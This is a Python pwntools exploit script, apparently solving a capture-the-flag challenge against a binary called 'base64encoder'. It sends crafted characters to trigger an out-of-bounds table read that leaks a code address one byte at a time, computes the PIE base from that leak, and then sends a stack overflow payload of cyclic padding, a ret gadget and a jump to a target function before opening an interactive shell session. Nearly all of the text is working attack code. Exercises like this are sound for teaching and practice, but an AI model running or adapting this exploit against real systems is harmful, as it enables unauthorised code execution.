from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./base64encoder")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))



if args.GDB:
    gdb.attach(r,'')

leaked = b""

def my_leak(idx):
    global leaked
    sla("Text: ",chr(idx))
    ru("lt: ")
    leaked += r.recv(1)
# These numbers will leak from table[-1] to table[-8] (oob read)
# Which is an address from codebase
my_leak(255)
my_leak(250)
my_leak(245)
my_leak(240)
my_leak(239)
my_leak(235)
my_leak(230)
my_leak(227)
pie = u64(leaked[::-1]) - 0x15f8
leak("base",hex(pie))
# Stack overflow, beware movaps issue.
sla("Text: ",cyclic(72) + p64(pie+0x101a) + p64(pie + 0x1229))
sla("Text: ","")
r.interactive()